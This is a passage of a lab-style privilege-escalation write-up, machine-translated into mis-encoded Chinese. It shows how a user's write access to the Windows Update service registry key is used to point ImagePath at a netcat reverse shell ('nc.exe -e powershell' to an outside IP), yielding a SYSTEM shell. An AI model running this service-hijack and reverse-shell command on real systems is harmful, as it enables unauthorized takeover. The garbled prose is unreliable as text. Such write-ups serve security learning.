<img src="https://habrastorage.org/webt/k3/oe/z4/k3oez4vknoc6njwzz0tvs_wav8i.png" alt="å›¾ç‰‡"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æŸ¥çœ‹å…¶ä¸­åŒ…å«ä»€ä¹ˆã€‚</font></font><br>
<br>
<img src="https://habrastorage.org/webt/wy/pr/av/wypravr1cr2pa2im8on8yl34rew.png" alt="å›¾ç‰‡"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
è¿™äº›å›¢é˜Ÿæ˜¯æˆ‘ä»¬ä»…æœ‰çš„ã€‚</font><font style="vertical-align: inherit;">Get-Acl cmdletæ£€ç´¢è¡¨ç¤ºæ–‡ä»¶æˆ–èµ„æºçš„å®‰å…¨æè¿°ç¬¦çš„å¯¹è±¡ã€‚</font><font style="vertical-align: inherit;">å®‰å…¨æè¿°ç¬¦åŒ…å«èµ„æºè®¿é—®æ§åˆ¶åˆ—è¡¨ï¼ˆACLï¼‰ã€‚</font><font style="vertical-align: inherit;">ACLåŒ…å«ç”¨æˆ·å’Œç”¨æˆ·ç»„è®¿é—®èµ„æºæ‰€éœ€çš„æƒé™ã€‚</font><font style="vertical-align: inherit;">å› æ­¤ï¼Œæˆ‘å†³å®šè§£å†³æ–¹æ¡ˆçš„è·¯å¾„åœ¨äºæœåŠ¡åŠå…¶è®¿é—®ã€‚</font><font style="vertical-align: inherit;">è®©æˆ‘ä»¬è·å¾—Hectorå¯¹å®ƒä»¬çš„æ‰€æœ‰æœåŠ¡å’Œæƒé™ã€‚</font></font><br>
<br>
<pre><code class="bash hljs">get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i <span class="hljs-string">"Hector Users Path"</span></code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æŸ¥çœ‹è¾“å‡ºï¼Œæˆ‘ä»¬æ³¨æ„åˆ°Hectoræ‹¥æœ‰Windowsæ›´æ–°æœåŠ¡wuauservçš„å…¨éƒ¨æƒåˆ©ã€‚</font></font><br>
<br>
<img src="https://habrastorage.org/webt/sp/je/pk/spjepkdg3e1zsisqo8vhvz_1gmk.png" alt="å›¾ç‰‡"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Windowsæ“ä½œç³»ç»Ÿä¸­çš„æœåŠ¡ä»¥ç³»ç»Ÿç‰¹æƒè¿è¡Œã€‚</font><font style="vertical-align: inherit;">åœ¨ç³»ç»Ÿä¸­æ³¨å†ŒæœåŠ¡æ—¶ï¼ŒæœåŠ¡å¯æ‰§è¡Œæ–‡ä»¶çš„è·¯å¾„åœ¨ImagePathå±æ€§ä¸­å—åˆ°ä¿æŠ¤ã€‚</font><font style="vertical-align: inherit;">è®©æˆ‘ä»¬æ›´æ”¹æ­¤å±æ€§çš„å€¼å¹¶åŠ è½½å¤–å£³ã€‚</font></font><br>
<pre><code class="bash hljs">reg add <span class="hljs-string">"HKLM\System\CurrentControlSet\Services\wuauserv"</span> /v ImagePath /t REG_SZ /d <span class="hljs-string">"C:\Users\Hector\Documents\nc.exe -e powershell 10.10.15.82 6543"</span></code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ç°åœ¨å¯åŠ¨æ›´æ–°æœåŠ¡ã€‚</font></font><br>
<pre><code class="bash hljs">start-service wuauserv</code></pre><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
å¹¶ä¸”æˆ‘ä»¬è·å¾—äº†å…·æœ‰æœ€å¤§ç‰¹æƒçš„shellã€‚</font></font><br>
<br>
<img src="https://habrastorage.org/webt/im/w1/tq/imw1tqnkohjh-qs-nvwbuggywoy.png" alt="å›¾ç‰‡"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
æ‚¨å¯ä»¥é€šè¿‡</font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Telegram</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">åŠ å…¥æˆ‘ä»¬</font><font style="vertical-align: inherit;">ã€‚</font><font style="vertical-align: inherit;">åœ¨è¿™é‡Œï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°æœ‰è¶£çš„èµ„æ–™ï¼Œåˆå¹¶çš„è¯¾ç¨‹ä»¥åŠè½¯ä»¶ã€‚</font><font style="vertical-align: inherit;">è®©æˆ‘ä»¬å»ºç«‹ä¸€ä¸ªç¤¾åŒºï¼Œåœ¨è¿™ä¸ªç¤¾åŒºä¸­ï¼Œä¼šæœ‰ä¸€äº›ç²¾é€šITé¢†åŸŸçš„äººï¼Œç„¶åæˆ‘ä»¬å¯ä»¥åœ¨ä»»ä½•ITå’Œä¿¡æ¯å®‰å…¨æ€§é—®é¢˜ä¸Šäº’ç›¸å¸®åŠ©ã€‚</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../zh-CN499048/index.html">ç´¢å°”Â·è±ä¸‡ç‰¹ï¼ˆSol Levanteï¼‰ï¼šä»–ä»¬å¦‚ä½•ä¸ºNetflixåˆ¶ä½œ4Kå’ŒHDRåŠ¨ç”»</a></li>
<li><a href="../zh-CN499052/index.html">å¤–éƒ¨æ•°æ®å­˜å‚¨ï¼šä»IBM 1311åˆ°ä»Šå¤©ã€‚ç¬¬2éƒ¨åˆ†</a></li>
<li><a href="../zh-CN499054/index.html">æ–°é¢†å¯¼è€…ï¼šç”Ÿå­˜æŒ‡å¯¼</a></li>
<li><a href="../zh-CN499056/index.html">äºšé©¬é€Šçš„ç»„ç»‡æ–¹å¼</a></li>
<li><a href="../zh-CN499058/index.html">è°ä»äº‹æ·±åº¦éŸ³é¢‘ï¼Œä¸ºä»€ä¹ˆéœ€è¦æ·±åº¦éŸ³é¢‘</a></li>
<li><a href="../zh-CN499062/index.html">å°ç‰©ç†é—®é¢˜</a></li>
<li><a href="../zh-CN499064/index.html">ä½¿ç”¨ç»Ÿè®¡è¯­è¨€æ¨¡å‹çš„æ›¿ä»£ä¸Šä¸‹æ–‡ç†è§£</a></li>
<li><a href="../zh-CN499068/index.html">å®šä¹‰ç‚¹äº‘è½¬æ¢å‚æ•°</a></li>
<li><a href="../zh-CN499070/index.html">ĞŸAndroidĞ•AndroidStudioæˆ–å¦‚ä½•å……åˆ†ä½¿ç”¨VCSå·¥å…·</a></li>
<li><a href="../zh-CN499074/index.html">å¦‚ä½•åœ¨symfony 5 bundleä¸­é‡ç”¨ä»£ç ï¼Ÿç¬¬4éƒ¨åˆ†ã€‚ä¸»æœºæ†ç»‘æ‰©å±•</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>